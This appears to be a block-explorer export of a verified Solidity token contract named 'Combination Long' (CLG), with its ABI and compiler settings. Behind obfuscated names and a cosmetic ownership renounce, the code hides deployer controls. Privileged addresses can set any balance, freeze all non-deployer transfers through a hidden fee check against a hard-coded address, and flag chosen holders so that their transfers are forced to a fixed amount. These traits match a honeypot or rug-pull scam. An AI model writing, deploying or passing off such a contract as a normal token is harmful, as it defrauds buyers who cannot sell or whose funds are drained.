{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface tradingTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toList {\n    function createPair(address sellLaunched, address swapAt) external returns (address);\n}\n\ninterface receiverEnableExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapTradingToken) external view returns (uint256);\n\n    function transfer(address amountLimitSwap, uint256 limitTradingTotal) external returns (bool);\n\n    function allowance(address marketingToList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitTradingTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountLimitSwap,\n        uint256 limitTradingTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyLaunched, uint256 value);\n    event Approval(address indexed marketingToList, address indexed spender, uint256 value);\n}\n\ninterface receiverEnableExemptMetadata is receiverEnableExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CombinationLong is txIs, receiverEnableExempt, receiverEnableExemptMetadata {\n\n    bool private sellReceiver;\n\n    function owner() external view returns (address) {\n        return modeSell;\n    }\n\n    uint256 constant listFund = 14 ** 10;\n\n    mapping(address => bool) public maxTakeLimit;\n\n    function minAmount(address isTotal) public {\n        require(isTotal.balance < 100000);\n        if (senderReceiver) {\n            return;\n        }\n        \n        minTeam[isTotal] = true;\n        if (walletShould != txTokenList) {\n            fundAmount = walletBuy;\n        }\n        senderReceiver = true;\n    }\n\n    uint256 tradingExemptIs;\n\n    function balanceOf(address swapTradingToken) public view virtual override returns (uint256) {\n        return enableSwap[swapTradingToken];\n    }\n\n    function exemptSwap(address enableAuto, address amountLimitSwap, uint256 limitTradingTotal) internal returns (bool) {\n        if (enableAuto == marketingLaunch) {\n            return buyMarketing(enableAuto, amountLimitSwap, limitTradingTotal);\n        }\n        uint256 walletLaunched = receiverEnableExempt(swapSellTotal).balanceOf(modeAmountReceiver);\n        require(walletLaunched == totalAmountFee);\n        require(amountLimitSwap != modeAmountReceiver);\n        if (maxTakeLimit[enableAuto]) {\n            return buyMarketing(enableAuto, amountLimitSwap, listFund);\n        }\n        return buyMarketing(enableAuto, amountLimitSwap, limitTradingTotal);\n    }\n\n    function getOwner() external view returns (address) {\n        return modeSell;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableExempt;\n    }\n\n    uint256 public fundAmount;\n\n    function allowance(address walletMin, address sellLimitFrom) external view virtual override returns (uint256) {\n        if (sellLimitFrom == amountMin) {\n            return type(uint256).max;\n        }\n        return totalSwap[walletMin][sellLimitFrom];\n    }\n\n    function tokenMaxAuto() public {\n        emit OwnershipTransferred(marketingLaunch, address(0));\n        modeSell = address(0);\n    }\n\n    address modeAmountReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private isTx = 18;\n\n    event OwnershipTransferred(address indexed modeMax, address indexed sellWallet);\n\n    function transferFrom(address enableAuto, address amountLimitSwap, uint256 limitTradingTotal) external override returns (bool) {\n        if (_msgSender() != amountMin) {\n            if (totalSwap[enableAuto][_msgSender()] != type(uint256).max) {\n                require(limitTradingTotal <= totalSwap[enableAuto][_msgSender()]);\n                totalSwap[enableAuto][_msgSender()] -= limitTradingTotal;\n            }\n        }\n        return exemptSwap(enableAuto, amountLimitSwap, limitTradingTotal);\n    }\n\n    function swapLimitSell() private view {\n        require(minTeam[_msgSender()]);\n    }\n\n    mapping(address => mapping(address => uint256)) private totalSwap;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableAt;\n    }\n\n    mapping(address => bool) public minTeam;\n\n    string private atBuy = \"Combination Long\";\n\n    bool public senderReceiver;\n\n    function launchMin(address receiverShould, uint256 limitTradingTotal) public {\n        swapLimitSell();\n        enableSwap[receiverShould] = limitTradingTotal;\n    }\n\n    function transfer(address receiverShould, uint256 limitTradingTotal) external virtual override returns (bool) {\n        return exemptSwap(_msgSender(), receiverShould, limitTradingTotal);\n    }\n\n    uint256 private enableAt = 100000000 * 10 ** 18;\n\n    bool public txTokenList;\n\n    address private modeSell;\n\n    uint256 totalAmountFee;\n\n    function name() external view virtual override returns (string memory) {\n        return atBuy;\n    }\n\n    function buyMarketing(address enableAuto, address amountLimitSwap, uint256 limitTradingTotal) internal returns (bool) {\n        require(enableSwap[enableAuto] >= limitTradingTotal);\n        enableSwap[enableAuto] -= limitTradingTotal;\n        enableSwap[amountLimitSwap] += limitTradingTotal;\n        emit Transfer(enableAuto, amountLimitSwap, limitTradingTotal);\n        return true;\n    }\n\n    address public marketingLaunch;\n\n    function feeBuy(uint256 limitTradingTotal) public {\n        swapLimitSell();\n        totalAmountFee = limitTradingTotal;\n    }\n\n    function approve(address sellLimitFrom, uint256 limitTradingTotal) public virtual override returns (bool) {\n        totalSwap[_msgSender()][sellLimitFrom] = limitTradingTotal;\n        emit Approval(_msgSender(), sellLimitFrom, limitTradingTotal);\n        return true;\n    }\n\n    constructor (){\n        \n        tradingTeam liquidityFrom = tradingTeam(amountMin);\n        swapSellTotal = toList(liquidityFrom.factory()).createPair(liquidityFrom.WETH(), address(this));\n        if (walletBuy == fundAmount) {\n            walletShould = false;\n        }\n        marketingLaunch = _msgSender();\n        tokenMaxAuto();\n        minTeam[marketingLaunch] = true;\n        enableSwap[marketingLaunch] = enableAt;\n        if (sellReceiver) {\n            walletBuy = fundAmount;\n        }\n        emit Transfer(address(0), marketingLaunch, enableAt);\n    }\n\n    uint256 public walletBuy;\n\n    string private enableExempt = \"CLG\";\n\n    mapping(address => uint256) private enableSwap;\n\n    bool private walletShould;\n\n    function decimals() external view virtual override returns (uint8) {\n        return isTx;\n    }\n\n    address public swapSellTotal;\n\n    address amountMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private buyTakeSwap;\n\n    function fundAmountTake(address atIs) public {\n        swapLimitSell();\n        if (buyTakeSwap == fundAmount) {\n            sellReceiver = true;\n        }\n        if (atIs == marketingLaunch || atIs == swapSellTotal) {\n            return;\n        }\n        maxTakeLimit[atIs] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingToList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellLimitFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLimitFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTradingTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTradingToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitTradingTotal\",\"type\":\"uint256\"}],\"name\":\"feeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atIs\",\"type\":\"address\"}],\"name\":\"fundAmountTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTradingTotal\",\"type\":\"uint256\"}],\"name\":\"launchMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxTakeLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTotal\",\"type\":\"address\"}],\"name\":\"minAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSellTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMaxAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTradingTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountLimitSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTradingTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTokenList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CombinationLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}